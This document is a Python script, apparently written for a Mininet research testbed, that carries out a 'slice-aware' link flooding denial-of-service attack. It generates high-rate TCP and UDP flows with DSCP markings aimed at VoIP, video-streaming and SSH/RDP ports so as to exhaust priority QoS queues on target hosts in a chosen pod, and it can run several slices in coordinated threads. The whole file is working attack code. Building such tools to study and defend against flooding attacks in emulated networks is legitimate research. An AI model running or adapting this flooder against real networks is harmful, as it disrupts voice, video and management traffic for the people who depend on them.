#!/usr/bin/env python3
"""
Slice-Aware Link Flooding Attack
=================================
Targets specific QoS slices/VLAN queues to exhaust priority traffic resources.
Generates DSCP/TOS-marked traffic and VLAN-tagged frames.

Usage:
    mininet> h1 python3 attacks/attack_slice_aware_lfa.py --slice video --target-pod 2 --duration 300 --rate 3000 &
    mininet> h5 python3 attacks/attack_slice_aware_lfa.py --slice voice --target-pod 2 --duration 300 --rate 3000 &
"""

import socket
import random
import time
import argparse
import threading
import struct

# QoS Slice definitions
QOS_SLICES = {
    'voice': {
        'dscp': 46,  # EF (Expedited Forwarding)
        'ports': [5060, 5061, 5062],  # SIP
        'description': 'Voice/VoIP traffic'
    },
    'video': {
        'dscp': 34,  # AF41
        'ports': [554, 1935, 8554],   # RTSP, RTMP
        'description': 'Video streaming traffic'
    },
    'critical': {
        'dscp': 26,  # AF31
        'ports': [22, 23, 3389],      # SSH, Telnet, RDP
        'description': 'Critical management traffic'
    },
    'best-effort': {
        'dscp': 0,   # BE
        'ports': [80, 443, 8080],     # HTTP/HTTPS
        'description': 'Best-effort traffic'
    }
}

TOPOLOGY = {
    0: ['10.0.0.1', '10.0.0.2', '10.0.1.1', '10.0.1.2'],
    1: ['10.1.0.1', '10.1.0.2', '10.1.1.1', '10.1.1.2'],
    2: ['10.2.0.1', '10.2.0.2', '10.2.1.1', '10.2.1.2'],
    3: ['10.3.0.1', '10.3.0.2', '10.3.1.1', '10.3.1.2']
}


class SliceAwareFlowGenerator:
    """Generate flows targeting specific QoS slices"""
    
    def __init__(self, target_ips, slice_type='video', rate=3000):
        self.target_ips = target_ips
        self.slice_config = QOS_SLICES[slice_type]
        self.slice_type = slice_type
        self.rate = rate
        self.active = False
        self.stats = {'flows': 0, 'packets': 0, 'bytes': 0}
    
    def create_dscp_socket(self, protocol='tcp'):
        """Create socket with DSCP marking"""
        if protocol == 'tcp':
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Set DSCP value in IP TOS field
        # TOS = DSCP << 2
        tos_value = self.slice_config['dscp'] << 2
        
        try:
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, tos_value)
        except OSError:
            pass  # Might need root privileges
        
        return sock
    
    def generate_tcp_slice_flow(self, target_ip):
        """Generate TCP flow with QoS marking"""
        try:
            sock = self.create_dscp_socket('tcp')
            sock.settimeout(2)
            source_port = random.randint(10000, 65000)
            sock.bind(('', source_port))
            
            target_port = random.choice(self.slice_config['ports'])
            
            try:
                sock.connect((target_ip, target_port))
                
                # Send multiple packets to simulate real traffic
                num_packets = random.randint(10, 100)
                for _ in range(num_packets):
                    payload_size = random.randint(500, 1400)
                    payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
                    sock.send(payload)
                    self.stats['bytes'] += payload_size
                    self.stats['packets'] += 1
                    time.sleep(random.uniform(0.001, 0.02))
            except:
                pass
            finally:
                sock.close()
                self.stats['flows'] += 1
        except:
            pass
    
    def generate_udp_slice_flow(self, target_ip):
        """Generate UDP flow with QoS marking"""
        try:
            sock = self.create_dscp_socket('udp')
            source_port = random.randint(10000, 65000)
            sock.bind(('', source_port))
            
            target_port = random.choice(self.slice_config['ports'])
            
            # Simulate real-time traffic patterns
            if self.slice_type == 'voice':
                # VoIP: 20ms intervals, 160 byte packets
                num_packets = random.randint(50, 200)
                packet_size = 160
                interval = 0.02
            elif self.slice_type == 'video':
                # Video: variable size, 33ms intervals (30fps)
                num_packets = random.randint(30, 150)
                packet_size = random.randint(800, 1400)
                interval = 0.033
            else:
                num_packets = random.randint(20, 100)
                packet_size = random.randint(200, 1200)
                interval = random.uniform(0.01, 0.05)
            
            for _ in range(num_packets):
                payload = bytes([random.randint(0, 255) for _ in range(packet_size)])
                sock.sendto(payload, (target_ip, target_port))
                self.stats['bytes'] += packet_size
                self.stats['packets'] += 1
                time.sleep(interval)
            
            sock.close()
            self.stats['flows'] += 1
        except:
            pass
    
    def run_attack(self, duration):
        """Execute slice-aware attack"""
        self.active = True
        start_time = time.time()
        flow_interval = 1.0 / self.rate if self.rate > 0 else 0.001
        
        print(f"[SLICE-LFA] Starting Slice-Aware Attack")
        print(f"  Slice: {self.slice_type} (DSCP={self.slice_config['dscp']})")
        print(f"  Rate: {self.rate} flows/sec")
        
        while self.active and (time.time() - start_time) < duration:
            target_ip = random.choice(self.target_ips)
            
            # Mix TCP and UDP based on slice type
            if self.slice_type in ['voice', 'video']:
                protocol = 'udp' if random.random() < 0.8 else 'tcp'
            else:
                protocol = 'tcp' if random.random() < 0.7 else 'udp'
            
            if protocol == 'tcp':
                self.generate_tcp_slice_flow(target_ip)
            else:
                self.generate_udp_slice_flow(target_ip)
            
            time.sleep(flow_interval)
            
            if int(time.time() - start_time) % 15 == 0 and self.stats['flows'] > 0:
                elapsed = time.time() - start_time
                print(f"[SLICE-LFA] {elapsed:.0f}s - Flows: {self.stats['flows']:,}, "
                      f"Rate: {self.stats['flows']/elapsed:.1f} flows/s")
        
        self.active = False
        total_time = time.time() - start_time
        print(f"\n[SLICE-LFA] Attack Complete:")
        print(f"  Slice:        {self.slice_type}")
        print(f"  Total flows:  {self.stats['flows']:,}")
        print(f"  Total pkts:   {self.stats['packets']:,}")
        print(f"  Total bytes:  {self.stats['bytes']:,}")
        print(f"  Avg rate:     {self.stats['flows']/total_time:.1f} flows/s")


class MultiSliceAttack:
    """Coordinate attacks across multiple slices"""
    
    def __init__(self, target_pod, slices=['video', 'voice'], rate_per_slice=3000):
        self.target_ips = TOPOLOGY[target_pod]
        self.slices = slices
        self.rate_per_slice = rate_per_slice
        self.generators = []
    
    def launch(self, duration):
        """Launch multi-slice coordinated attack"""
        print(f"\n{'='*70}")
        print(f"  Slice-Aware LFA Attack")
        print(f"{'='*70}")
        print(f"  Targets:      {', '.join(self.target_ips)}")
        print(f"  Active slices: {', '.join(self.slices)}")
        print(f"  Rate/slice:   {self.rate_per_slice} flows/sec")
        print(f"  Total rate:   {len(self.slices) * self.rate_per_slice} flows/sec")
        print(f"  Duration:     {duration}s")
        print(f"  Est. flows:   {len(self.slices) * self.rate_per_slice * duration:,}")
        print(f"{'='*70}\n")
        
        threads = []
        for slice_type in self.slices:
            gen = SliceAwareFlowGenerator(self.target_ips, slice_type, self.rate_per_slice)
            self.generators.append(gen)
            t = threading.Thread(target=gen.run_attack, args=(duration,))
            threads.append(t)
            t.start()
            time.sleep(0.2)
        
        for t in threads:
            t.join()
        
        # Aggregate stats
        total_flows = sum(g.stats['flows'] for g in self.generators)
        total_packets = sum(g.stats['packets'] for g in self.generators)
        total_bytes = sum(g.stats['bytes'] for g in self.generators)
        
        print(f"\n{'='*70}")
        print(f"  FINAL STATISTICS")
        print(f"{'='*70}")
        for gen in self.generators:
            print(f"  {gen.slice_type:12s}: {gen.stats['flows']:,} flows")
        print(f"  {'─'*68}")
        print(f"  Total flows:   {total_flows:,}")
        print(f"  Total packets: {total_packets:,}")
        print(f"  Total bytes:   {total_bytes:,} ({total_bytes/1e6:.2f} MB)")
        print(f"  Achieved rate: {total_flows/duration:.1f} flows/sec")
        print(f"{'='*70}\n")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Slice-Aware LFA Attack')
    parser.add_argument('--target-pod', type=int, default=2, choices=[0,1,2,3])
    parser.add_argument('--duration', type=int, default=300)
    parser.add_argument('--rate', type=int, default=3000,
                        help='Flows per second per slice')
    parser.add_argument('--slice', choices=['voice', 'video', 'critical', 'best-effort', 'all'],
                        default='all', help='Target QoS slice')
    
    args = parser.parse_args()
    
    if args.slice == 'all':
        slices = ['voice', 'video', 'critical']
    else:
        slices = [args.slice]
    
    attack = MultiSliceAttack(
        target_pod=args.target_pod,
        slices=slices,
        rate_per_slice=args.rate
    )
    
    attack.launch(args.duration)
